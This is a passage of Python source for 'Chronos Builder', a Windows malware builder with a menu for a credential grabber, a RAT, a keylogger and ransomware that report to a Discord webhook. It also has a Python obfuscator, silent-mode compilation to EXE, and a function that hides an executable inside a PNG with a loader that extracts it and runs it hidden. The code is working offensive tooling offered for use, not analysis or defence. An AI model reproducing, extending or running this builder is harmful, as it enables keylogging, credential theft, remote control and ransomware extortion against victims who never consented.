        webhook = input(Colors.CYAN + f"Webhook URL [{default_webhook}]: " + Colors.RESET).strip()
        if not webhook:
            webhook = default_webhook
        name = input(Colors.CYAN + f"Output name [{default_name}]: " + Colors.RESET).strip()
        if not name:
            name = default_name
        console_in = input(Colors.CYAN + f"Show console? (Y/N) [{default_console}]: " + Colors.RESET).strip().upper()
        if console_in not in ("Y", "N"):
            console_in = default_console
        console = (console_in == "Y")
        icon_in = input(Colors.CYAN + f"Use icon.ico? (Y/N) [{default_icon}]: " + Colors.RESET).strip().upper()
        if icon_in not in ("Y", "N"):
            icon_in = default_icon
        icon = (icon_in == "Y")
        silent_in = input(Colors.CYAN + f"Silent mode (hide all windows)? (Y/N) [{default_silent}]: " + Colors.RESET).strip().upper()
        if silent_in not in ("Y", "N"):
            silent_in = default_silent
        silent = (silent_in == "Y")
        print(Colors.YELLOW + "\n[*] Building keylogger..." + Colors.RESET)
        replacements = {"REPLACE_WITH_WEBHOOK": webhook}
        success = self._compile(STUB_KEYLOGGER, name, console, icon, silent, replacements)
        if success:
            print(Colors.GREEN + f"[V] Keylogger built: {self.output_dir}/{name}.exe" + Colors.RESET)
        else:
            print(Colors.RED + "[X] Build failed." + Colors.RESET)
        pause()
    def build_ransomware(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        BUILD RANSOMWARE (standalone, webhook key)" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        default_webhook = "https://discord.com/api/webhooks/your_webhook_id/your_token"
        default_name = "ransomware"
        default_console = "N"
        default_icon = "N"
        default_silent = "Y"
        print(f"\n{Colors.GRAY}Defaults: webhook={default_webhook}, name={default_name}, console={default_console}, icon={default_icon}, silent={default_silent}{Colors.RESET}")
        webhook = input(Colors.CYAN + f"Webhook URL [{default_webhook}]: " + Colors.RESET).strip()
        if not webhook:
            webhook = default_webhook
        name = input(Colors.CYAN + f"Output name [{default_name}]: " + Colors.RESET).strip()
        if not name:
            name = default_name
        console_in = input(Colors.CYAN + f"Show console? (Y/N) [{default_console}]: " + Colors.RESET).strip().upper()
        if console_in not in ("Y", "N"):
            console_in = default_console
        console = (console_in == "Y")
        icon_in = input(Colors.CYAN + f"Use icon.ico? (Y/N) [{default_icon}]: " + Colors.RESET).strip().upper()
        if icon_in not in ("Y", "N"):
            icon_in = default_icon
        icon = (icon_in == "Y")
        silent_in = input(Colors.CYAN + f"Silent mode (hide all windows)? (Y/N) [{default_silent}]: " + Colors.RESET).strip().upper()
        if silent_in not in ("Y", "N"):
            silent_in = default_silent
        silent = (silent_in == "Y")
        print(Colors.YELLOW + "\n[*] Building ransomware..." + Colors.RESET)
        replacements = {"REPLACE_WITH_WEBHOOK": webhook}
        success = self._compile(STUB_RANSOMWARE, name, console, icon, silent, replacements)
        if success:
            print(Colors.GREEN + f"[V] Ransomware built: {self.output_dir}/{name}.exe" + Colors.RESET)
        else:
            print(Colors.RED + "[X] Build failed." + Colors.RESET)
        pause()
    def script_to_exe(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        SCRIPT TO EXE – Compile any Python script" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        script_path = input(Colors.CYAN + "Path to Python script (.py): " + Colors.RESET).strip()
        if not os.path.isfile(script_path):
            print(Colors.RED + "File not found." + Colors.RESET)
            pause()
            return
        default_name = Path(script_path).stem
        name = input(Colors.CYAN + f"Output EXE name [{default_name}]: " + Colors.RESET).strip()
        if not name:
            name = default_name
        console_in = input(Colors.CYAN + "Show console? (Y/N) [N]: " + Colors.RESET).strip().upper()
        console = console_in == "Y"
        icon_in = input(Colors.CYAN + "Use icon.ico? (Y/N) [N]: " + Colors.RESET).strip().upper()
        icon = icon_in == "Y"
        silent_in = input(Colors.CYAN + "Silent mode (hide all windows)? (Y/N) [Y]: " + Colors.RESET).strip().upper()
        silent = silent_in != "N"
        with open(script_path, 'r', encoding='utf-8') as f:
            script_code = f.read()
        stub = f'''import sys, os
if __name__ == "__main__":
    exec(''' + repr(script_code) + ''')
'''
        replacements = {}
        success = self._compile(stub, name, console, icon, silent, replacements)
        if success:
            print(Colors.GREEN + f"[V] EXE built: {self.output_dir}/{name}.exe" + Colors.RESET)
        else:
            print(Colors.RED + "[X] Build failed." + Colors.RESET)
        pause()
    def exe_to_image(self):
        clear_screen()
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        print(Colors.CYAN + "        EXE TO IMAGE – Hide EXE inside PNG" + Colors.RESET)
        print(Colors.CYAN + "=====================================================" + Colors.RESET)
        exe_path = input(Colors.CYAN + "Path to EXE file: " + Colors.RESET).strip()
        if not os.path.isfile(exe_path):
            print(Colors.RED + "File not found." + Colors.RESET)
            pause()
            return
        default_name = Path(exe_path).stem
        img_name = input(Colors.CYAN + f"Output image name [{default_name}.png]: " + Colors.RESET).strip()
        if not img_name:
            img_name = default_name + ".png"
        else:
            if not img_name.endswith('.png'):
                img_name += '.png'
        import base64
        png_b64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
        png_data = base64.b64decode(png_b64)
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        output_data = png_data + exe_data
        output_path = self.output_dir / img_name
        with open(output_path, 'wb') as f:
            f.write(output_data)
        loader = f'''
import os, sys, tempfile, subprocess, base64
def extract_exe():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(script_dir, "{img_name}")
    if not os.path.exists(image_path):
        print("Image not found.")
        return None
    with open(image_path, 'rb') as f:
        data = f.read()
    iend = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'
    pos = data.find(iend)
    if pos == -1:
        print("Could not find IEND chunk.")
        return None
    exe_start = pos + len(iend)
    exe_data = data[exe_start:]
    if not exe_data:
        print("No EXE data found.")
        return None
    temp_exe = os.path.join(tempfile.gettempdir(), "extracted.exe")
    with open(temp_exe, 'wb') as f:
        f.write(exe_data)
    return temp_exe
if __name__ == "__main__":
    exe_path = extract_exe()
    if exe_path:
        subprocess.Popen([exe_path], creationflags=0x08000000 if os.name == 'nt' else 0)
'''
        loader_path = self.output_dir / f"extract_{default_name}.py"
        with open(loader_path, 'w', encoding='utf-8') as f:
            f.write(loader)
        print(Colors.GREEN + f"[V] Image saved: {output_path}" + Colors.RESET)
        print(Colors.GREEN + f"[V] Loader script saved: {loader_path}" + Colors.RESET)
        print(Colors.YELLOW + "To run the hidden EXE, execute the loader script." + Colors.RESET)
        pause()
# ============================================================================
# OBFUSCATOR WRAPPER
# ============================================================================
def obfuscate_script():
    clear_screen()
    print(Colors.CYAN + "=====================================================" + Colors.RESET)
    print(Colors.CYAN + "        OBFUSCATOR – Protect Python scripts" + Colors.RESET)
    print(Colors.CYAN + "=====================================================" + Colors.RESET)
    input_file = input(Colors.CYAN + "Path to Python script (.py): " + Colors.RESET).strip()
    if not os.path.isfile(input_file):
        print(Colors.RED + "File not found." + Colors.RESET)
        pause()
        return
    default_output = Path(input_file).stem + "_obf.py"
    output_file = input(Colors.CYAN + f"Output filename [{default_output}]: " + Colors.RESET).strip()
    if not output_file:
        output_file = default_output
    try:
        obf = UltimateObfuscator(input_file)
        obf.build(output_file)
        print(Colors.GREEN + "[V] Obfuscation complete." + Colors.RESET)
    except Exception as e:
        print(Colors.RED + f"Obfuscation failed: {e}" + Colors.RESET)
    pause()
# ============================================================================
# MAIN MENU – All separators are ASCII-only
# ============================================================================
def main_menu():
    while True:
        clear_screen()
        print_banner()
        print_chronos_links()
        print(f"""
{Colors.CYAN}------------------------------------------------------------------{Colors.RESET}
{Colors.WHITE}  {Colors.BOLD}[1]{Colors.RESET} Build Grabber      – base stealer features 
{Colors.WHITE}  {Colors.BOLD}[2]{Colors.RESET} Build RAT          – essential remote commands
{Colors.WHITE}  {Colors.BOLD}[3]{Colors.RESET} Build Keylogger    – standalone keylogger (webhook)
{Colors.WHITE}  {Colors.BOLD}[4]{Colors.RESET} Build Ransomware   – standalone file encryptor (webhook)
{Colors.WHITE}  {Colors.BOLD}[5]{Colors.RESET} Obfuscator         – obfuscate Python scripts
{Colors.WHITE}  {Colors.BOLD}[6]{Colors.RESET} Script to EXE      – compile any Python script to EXE
{Colors.WHITE}  {Colors.BOLD}[7]{Colors.RESET} EXE to Image       – hide EXE inside PNG image
{Colors.WHITE}  {Colors.BOLD}[0]{Colors.RESET} Exit
{Colors.CYAN}------------------------------------------------------------------{Colors.RESET}
""")
        choice = input(f"{Colors.CYAN}Select option: {Colors.RESET}").strip()
        builder = Builder()
        if choice == "1":
            builder.build_grabber()
        elif choice == "2":
            builder.build_rat()
        elif choice == "3":
            builder.build_keylogger()
        elif choice == "4":
            builder.build_ransomware()
        elif choice == "5":
            obfuscate_script()
        elif choice == "6":
            builder.script_to_exe()
        elif choice == "7":
            builder.exe_to_image()
        elif choice == "0":
            print(Colors.GREEN + "Exiting..." + Colors.RESET)
            sys.exit(0)
        else:
            print(Colors.RED + "Invalid option" + Colors.RESET)
        pause()
# ============================================================================
# START
# ============================================================================
if __name__ == "__main__":
    try:
        if getattr(sys, "frozen", False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        os.chdir(base_dir)
    except Exception:
        pass

    if os.name == 'nt':
        os.system("title Chronos Builder – Free Edition")
        try:
            os.system('mode con: cols=110 lines=35')
        except:
            pass
    else:
        print(Colors.YELLOW + "[!] This tool is designed for Windows. Some features may not work correctly on other OS." + Colors.RESET)
    main_menu()
